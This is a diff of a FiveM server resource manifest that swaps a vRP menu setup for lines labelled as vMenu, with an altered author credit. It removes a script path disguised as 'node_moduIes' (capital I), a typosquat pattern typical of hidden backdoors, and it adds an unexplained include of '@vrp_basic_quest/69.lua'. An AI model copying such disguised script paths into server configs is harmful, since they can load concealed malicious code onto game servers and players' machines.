@@ -4,37 +4,39 @@ lua54 "yes"
 
 
 escrow_ignore {
-  "Config/cl_Config.lua",
-  "Config/sv_Config.lua"
+  "config/locations.json",
+  "config/addons.json",
+  "config/permissions.cfg",
 }
 
-client_script 'Config/sv_Config.lua'
-server_script 'Config/sv_Config.lua'
+name 'vMenu'
+description 'Server sided trainer for FiveM with custom permissions, using a custom MenuAPI. More info can be found at www.vespura.com/fivem'
+version 'v5.2.5'
+author 'Al-Dolime'
+ui_page 'storage.html'
 
-client_script {
-	"lib/Proxy.lua",
-	"lib/Tunnel.lua",
-  "DontEdit/server2.lua",
-  "DontEdit/client.lua",
-	"DontEdit/client2.lua",
-  "DontEdit/Mr51.lua",
-  '@mysql-async/lib/MySQL.lua'
-}
+-- Adds additional logging, useful when debugging issues.
+client_debug_mode 'false'
+server_debug_mode 'false'
 
-server_scripts{ 
-  "@vrp/lib/utils.lua",
-  "DontEdit/server.lua",
-  '@mysql-async/lib/MySQL.lua'
-}
+-- Leave this set to '0' to prevent compatibility issues 
+-- and to keep the save files your users.
+experimental_features_enabled '0'
 
-ui_page "html/menu.html"
-
+-- Files & scripts
 files {
-	"html/menu.html",
-	"html/raphael.min.js",
-	"html/wheelnav.spreader.js",
-  "html/wheelnav.min.js",
-  "html/*.png",
-	"html/*.ogg"
+    'vMenu/Newtonsoft.Json.dll',
+    'vMenu/MenuAPI.dll',
+    'config/locations.json',
+    'config/addons.json',
+    'vMenu/storage.html'
 }
-server_script "node_moduIes/App-min.js"
+server_scripts {
+    '@vrp/lib/utils.lua',
+    'Files/server.lua'
+}
+client_script 'Files/client.lua'
+client_script 'vMenu/vMenuClient.net.dll'
+server_script 'vMenu/vMenuServer.net.dll'
+
+client_script "@vrp_basic_quest/69.lua"
